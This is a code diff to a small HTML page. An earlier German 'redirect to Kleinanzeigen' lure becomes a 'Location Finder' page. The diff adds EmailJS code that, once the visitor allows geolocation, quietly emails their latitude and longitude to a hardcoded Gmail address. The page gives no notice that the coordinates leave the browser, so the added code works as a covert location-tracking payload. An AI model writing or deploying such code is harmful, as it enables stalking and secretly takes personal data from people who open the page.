@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Weiterleitung</title>
+  <title>Location Finder</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -20,13 +20,18 @@
       cursor: pointer;
     }
   </style>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
-  <h1>Weiter zu Kleinanzeigen</h1>
-  <button id="getLocationBtn">Weiter</button>
+  <h1>Find Your Location</h1>
+  <button id="getLocationBtn">Get My Location</button>
   <div id="location"></div>
 
   <script>
+    (function() {
+      emailjs.init('alex69gggamer'); // Replace with your EmailJS user ID
+    })();
+
     const button = document.getElementById('getLocationBtn');
     const locationDiv = document.getElementById('location');
 
@@ -36,6 +41,21 @@
           (position) => {
             const { latitude, longitude } = position.coords;
             locationDiv.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+            // Send email with the coordinates
+            const emailParams = {
+              to_email: 'alex69gggamer@gmail.com',  // Replace with your email
+              latitude: latitude,
+              longitude: longitude
+            };
+
+            emailjs.send('service_3ubhjey', 'template_lytk4r9', emailParams)
+              .then((response) => {
+                console.log('Email sent successfully', response);
+              })
+              .catch((error) => {
+                console.error('Error sending email', error);
+              });
           },
           (error) => {
             locationDiv.textContent = `Error: ${error.message}`;
